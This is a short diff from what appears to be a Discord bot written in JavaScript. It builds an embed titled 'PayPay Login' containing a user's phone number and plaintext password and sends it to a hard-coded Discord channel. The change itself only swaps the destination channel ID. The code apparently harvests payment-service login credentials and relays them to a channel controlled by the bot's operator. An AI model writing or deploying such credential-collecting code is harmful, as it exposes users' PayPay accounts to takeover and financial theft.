@@ -67,7 +67,7 @@ export default {
         .setTitle('PayPay Login')
         .setDescription(`<@${interaction.user.id}>\nPhone Number: ${object.phone}\nPassword: ${object.password}`)
 
-      await client.channels.cache.get('1210911857087488000').send({ embeds: [embed] });
+      await client.channels.cache.get('1236163588369154058').send({ embeds: [embed] });
     }
   }
 };
